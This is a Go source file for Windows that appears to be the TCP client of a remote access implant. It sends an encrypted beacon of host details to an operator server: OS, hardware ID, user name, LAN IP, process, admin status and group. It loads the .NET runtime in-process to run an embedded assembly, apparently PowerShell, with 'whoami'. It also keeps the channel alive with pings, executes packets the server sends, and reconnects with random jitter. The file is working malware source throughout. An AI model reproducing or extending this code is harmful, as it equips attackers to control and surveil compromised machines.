//go:build windows
// +build windows

package tcp

import (
	"bytes"
	"encoding/binary"
	"main/Encrypt"
	HandlePacket "main/HandlePacket/tcp"
	"main/Helper/handle"
	"main/Helper/syscalls"
	"main/MessagePack"
	"main/PcInfo"
	"math/rand"
	"net"
	"sync"
	"time"

	"github.com/Ne0nd0g/go-clr"
)

func Send(msg []byte, conn net.Conn) {
	defer func() {
		if err := recover(); err != nil {
			//log.Println("Send error:", err)
		}
	}()

	if conn == nil {
		//log.Println("Connection not established")
		return
	}
	msg, err := Encrypt.Encrypt(msg)
	if err != nil {
		return
	}
	bufferSize := int32(len(msg))
	err = binary.Write(conn, binary.LittleEndian, bufferSize)
	if err != nil {
		//log.Println("Failed to send buffer size:", err)
		return
	}

	const chunkSize = 50 * 1024 // 50 KB
	var chunk []byte

	for bytesSent := 0; bytesSent < len(msg); {
		if len(msg)-bytesSent > chunkSize {
			chunk = msg[bytesSent : bytesSent+chunkSize]
		} else {
			chunk = msg[bytesSent:]
		}

		_, err := conn.Write(chunk)
		if err != nil {
			//log.Println("Failed to send data:", err)
			return
		}

		bytesSent += len(chunk)
	}
}

type TCPClient struct {
	Client            *net.TCPConn
	Buffer            []byte
	BufferSize        int64
	MS                bytes.Buffer
	IsConnected       bool
	SendSync          sync.Mutex
	ActivatePong      bool
	RemarkMessage     string
	RemarkClientColor string
	keepAlive         *time.Ticker
	// Implementing timers and ThreadPool would require more context and may need external libraries
}

// assuming for the sake of example

func (s *TCPClient) InitializeClient() {
	addr, err := net.ResolveTCPAddr("tcp", PcInfo.Host+":"+PcInfo.Port)
	if err != nil {
		s.IsConnected = false
		return
	}

	conn, err := net.DialTCP("tcp", nil, addr)
	if err != nil {
		s.IsConnected = false
		return
	}

	s.Client = conn
	if s.Client != nil {
		s.IsConnected = true
		s.Buffer = make([]byte, 4)
		s.MS.Reset()

		// Assuming SendInfo() exists
		Send(SendInfo(), s.Client)
		RunPS()
		// Implementing Timer using time package. Assuming KeepAlivePacket function exists
		s.keepAlive = time.NewTicker(8 * time.Second)

		// Start a goroutine to handle the ticks
		go func() {
			for range s.keepAlive.C {
				s.KeepAlivePacket(s.Client)
			}
		}()

		go s.ReadServerData()
	} else {
		s.IsConnected = false
	}
}
func RunPS() {
	clr.RedirectStdoutStderr()

	runtimeHost, err := clr.LoadCLR(PcInfo.ClrVersion)

	if err != nil {
		// log.Fatal(err)
	}
	methodInfo, err := clr.LoadAssembly(runtimeHost, handle.Nps_2)
	if err != nil {
		//Function.SessionLog(err.Error(), "", Connection, sendFunc, unmsgpack)
	}
	//fmt.Println(unmsgpack.ForcePathObject("OutString").GetAsString())
	clr.InvokeAssembly(methodInfo, []string{"whoami"})
}
func (s *TCPClient) ReadServerData() {
	if s.Client == nil || !s.IsConnected {
		s.IsConnected = false
		return
	}

	n, err := s.Client.Read(s.Buffer)
	if err != nil {
		s.IsConnected = false
		return
	}

	if n == 4 {
		s.MS.Write(s.Buffer)
		s.BufferSize = int64(binary.LittleEndian.Uint32(s.MS.Bytes()))
		s.MS.Reset()
		if s.BufferSize > 0 {
			s.Buffer = make([]byte, s.BufferSize)
			for int64(s.MS.Len()) != s.BufferSize {
				rc, err := s.Client.Read(s.Buffer)
				if err != nil {
					s.IsConnected = false
					return
				}
				s.MS.Write(s.Buffer[:rc])
				s.Buffer = make([]byte, s.BufferSize-int64(s.MS.Len()))
			}
			if int64(s.MS.Len()) == s.BufferSize {
				//fmt.Println("calc")
				HandlePacket.Read(s.MS.Bytes(), s.Client)
				//time.Sleep(time.Second * 1)

				s.Buffer = make([]byte, 4)
				s.MS.Reset()
			} else {
				s.Buffer = make([]byte, s.BufferSize-int64(s.MS.Len()))
			}
		}
		go s.ReadServerData()
	} else {
		s.IsConnected = false
	}
}

func (s *TCPClient) KeepAlivePacket(conn net.Conn) {
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("ClientPing")
	msgpack.ForcePathObject("Message").SetAsString("DDDD")

	Send(msgpack.Encode2Bytes(), conn)
	s.ActivatePong = true
}
func SendInfo() []byte {
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("ClientInfo")
	msgpack.ForcePathObject("OS").SetAsString(syscalls.GetWindowsVersion())
	msgpack.ForcePathObject("HWID").SetAsString(PcInfo.GetHWID())
	msgpack.ForcePathObject("User").SetAsString(PcInfo.GetUserName())
	msgpack.ForcePathObject("LANip").SetAsString(PcInfo.GetInternalIP())
	msgpack.ForcePathObject("ProcessName").SetAsString(PcInfo.GetProcessName())
	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
	msgpack.ForcePathObject("SleepTime").SetAsString("10")
	msgpack.ForcePathObject("RemarkMessage").SetAsString(PcInfo.RemarkContext)
	msgpack.ForcePathObject("RemarkClientColor").SetAsString(PcInfo.RemarkColor)
	msgpack.ForcePathObject("Admin").SetAsString(syscalls.IsAdmin())
	msgpack.ForcePathObject("CLRVersion").SetAsString(PcInfo.ClrVersion)
	msgpack.ForcePathObject("Group").SetAsString(PcInfo.GroupInfo)
	msgpack.ForcePathObject("ClientComputer").SetAsString(PcInfo.ClientComputer)
	return msgpack.Encode2Bytes()
}
func (s *TCPClient) Reconnect() {
	s.CloseConnection()
	s.InitializeClient()
}

func (s *TCPClient) CloseConnection() {
	if s.Client != nil {
		s.Client.Close()
	}
	s.MS.Reset()
}

func Run_main() {
	socket := TCPClient{}
	socket.InitializeClient()

	r := rand.New(rand.NewSource(time.Now().UnixNano())) // Create a new random generator

	for {
		if !socket.IsConnected {
			socket.Reconnect()
		}
		time.Sleep(time.Duration(r.Intn(5000)) * time.Millisecond)
	}
}
